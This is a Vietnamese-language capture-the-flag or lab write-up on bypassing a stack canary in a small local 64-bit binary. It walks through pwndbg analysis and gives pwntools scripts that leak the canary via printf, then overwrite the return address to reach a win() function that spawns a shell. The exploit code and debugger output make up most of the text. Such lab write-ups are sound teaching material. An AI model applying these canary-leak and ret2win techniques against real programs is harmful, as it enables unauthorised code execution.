# *Challenge: canary*
***

- **Canary** là một giá trị ngẫu nhiên được đặt giữa buffer và return address trên stack. Mục tiêu là để phát hiện ghi đè tràn bộ đệm:
- Trước khi hàm trả về, chương trình sẽ kiểm tra canary. Nếu bị thay đổi -> chương trình kết thúc ngay.
**Các chế độ bảo vệ ảnh hưởng đến việc bypass canary:**
 ```
Bảo vệ	Ảnh hưởng
Canary	Phát hiện ghi đè stack
NX	Không cho thực thi shellcode
PIE	Địa chỉ code ngẫu nhiên
ASLR	Ngẫu nhiên hóa libc/stack
RELRO	Chống ghi đè GOT (không liên quan trực tiếp Canary)
```
*- Với file chall:*
 ```sh
 pwndbg> checksec
File:     /mnt/d/Documents/ISP/TASK1/6_bypass_canary/canary
Arch:     amd64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
pwndbg>
```
- Canary found -> cần leak
- NX enabled -> không dùng đc shellcode, nhưng có thể dùng ROP để gọi system(“/bin/sh”)
- No PIE -> biết đc địa chỉ hàm, dễ tìm gadget và gọi thẳng vào win() hoặc system() nếu có
- Stripped: No -> dễ reverse, dễ phân tích
**Xem pseudo code ở IDA xem, chương trình hoạt động ntn:**
- Có 3 hàm chính: main(), init(), win()
Mô tả chương trình hoạt động: Khai báo 2 chuỗi buf với v5, gán tất cả các phần tử trong 2 chuỗi giá trị thành giá trị null sau đó khai báo hàm init khởi tạo các bộ điệm, nhập lần lượt 2 chuỗi buf và v5 rồi kết thúc chương trình
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 buf[4]; // [rsp+0h] [rbp-130h] BYREF
  __int64 v5[34]; // [rsp+20h] [rbp-110h] BYREF

  v5[33] = __readfsqword(0x28u);
  memset(buf, 0, sizeof(buf));
  memset(v5, '\0', 256);
  init();
  printf("Your name: ");
  read(0, buf, 0x200uLL);
  printf("Hello %s\n", (const char *)buf);
  printf("Your feedback: ");
  read(0, v5, 0x200uLL);
  puts("Thank you for your feedback!");
  return 0;
}
```
```c
int win()
{
  return system("/bin/sh");
}
```
 
 
->**Mục tiêu:** ta thấy khi nhập đúng 0x200 byte hết khả năng của chuỗi sẽ thấy chương trình sẽ bị exit luôn do canary. Như vậy, cách duy nhất ta có thể làm là leak canary ra nếu có buffer overflow
* Tiến hành debug thử chương trình:
-  Ta thấy cái fs[0x28] là vị trí mà chứa cái giá trị canary, thì giá trị của canary nó chính là rax
```sh
   0x401243 <main+15>    mov    rax, qword ptr fs:[0x28]       RAX, [0x7ffff7dc1768] => 0x26beeff6e7971700
   ```
- Đặc điểm của canary: byte đầu tiên luôn là byte null còn 7 byte còn lại sẽ là ngẫu nhiên và khác null, giá trị canary sẽ khác nhau sau mỗi lần chạy
- Ta có thể dùng lệnh tel để tìm giá trị của canary, thường nó sẽ nằm ở trước saved sbp, saved rip, ta có thể kiểm tra bằng canary nó sẽ cho đúng giá trị canary
 ```sh
 pwndbg> canary
AT_RANDOM  = 0x7fffffffe109 # points to global canary seed value
TLS Canary = 0x7ffff7dc1768 # address where canary is stored
Canary     = 0x26beeff6e7971700 (may be incorrect on != glibc)
Thread 1: Found valid canaries.
00:0000│-2d8 0x7fffffffda98 ◂— 0x26beeff6e7971700
Additional results hidden. Use --all to see them.
pwndbg>
```
- Cách leak: ta biết rằng hàm read sẽ không tự động thêm null byte sau khi nhập do có ta có thể cho nó nối với cái canary, ta sẽ nhập tràn xuống đúng cái canary, mình sẽ overwrite 1 byte null của canary, sau nó tận dụng hàm printf ngay sau để in ra 1 dãy mình nhập vào cộng với 7 byte canary tìm được.

***Stage 1: Viết script leak canary***
- Đầu tiên ta sẽ tìm offset từ lúc nhập buf cho tới canary (dùng cyclic kết hợp với tel)
 ```sh
 pwndbg> cyclic -l 0x626161616161616d
Finding cyclic pattern of 8 bytes: b'maaaaaab' (hex: 0x6d61616161616162)
Found at offset 296
pwndbg>
```
-> offset = 296 + 1 ( Do ta phải overwrite của 1 byte null của canary vì hàm printf sẽ ngắt nếu gặp null, sau khi overwrite đc byte null thì printf sẽ ko thấy byte null sẽ in tiếp 7 byte của canary)
- Ta có script như sau:
 ```py
 payload = b'a'*(296+1)
p.sendafter(b'name: ', payload)
p.recvuntil(b'a'*(296+1))
canary = u64(b'\0' + p.recv(7))
print("canary leak: ", hex(canary))
```
Kiểm tra lại bằng debug động xem đúng chưa:
-> chính xác
***Stage 2: Viết script lấy shell***
- Ta sẽ viết 1 cái payload giữ nguyên cái giá trị canary vừa leak đó và sau đó overwrite ret thành địa chỉ hàm main là xong (ret2win) do có sẵn hàm win trong chương trình.
- Đầu tiên vẫn truyền vào 296 byte rác rồi là giá trị canary (để bypass canary) sau đó đến rbp và cuối cùng sẽ điều khiển đc rip thôi)
- Script lấy shell:
 
- Kiểm tra bằng debug động:
 
-> Thấy canary bị sai, khả năng do truyền thừa hoặc thiếu byte rác, ta sẽ tính lại offset từ lúc nhập v5 đến ret.
- Do v5 khai báo sau buf khoảng 0x20 byte, nên ta cần trừ bớt 0x20 byte vào truyền đúng canary
 
-> offset = 296 – 0x20
Ta có script mới :
 ```py
 payload = flat(
    b'a'*(296-0x20),
    canary,        
    0,                # saved rbp
    exe.sym['win']   # saved rip
    )
p.sendafter(b'feedback: ', payload)

p.interactive()
```
- Tiếp tục kiểm tra bằng debug động:
- Ta thấy lỗi 0x7fff2fb05ef8 ko chia hết cho 16. Ta có 2 hướng xử lý có thể nhảy trực tiếp vào win (+5 byte) hoặc tìm 1 địa chỉ của hàm ret nào đó trước khi truyền địa chỉ hàm win.
```
0000000000000130: The address of the variable buf.
0000000000000128: The address of var_128.
0000000000000120: The address of var_120.
0000000000000118: The address of var_118.
0000000000000110: The address of var_110.
0000000000000108: The address of var_108.
```
- payload cuối:
```py
payload = flat(
    b'a'*(296-0x20),
    canary,        
    0,                # saved rbp
    exe.sym['win'] + 5 # saved rip
    )
```
 
- Kiểm tra xem oke chưa:
 ```sh
$ python3 solve.py
[+] Starting local process '/mnt/d/Documents/ISP/TASK1/6_bypass_canary/canary': pid 315
canary leak:  0xdea3870ca1fa5800
[*] Switching to interactive mode
Thank you for your feedback!
$
$ whoami
d1nhdwc
$ ls
'~$eport6.docx'   canary   canary.i64   report6.docx   report6.md   solve.py
$
```
**-> Đã chiếm đc shell**
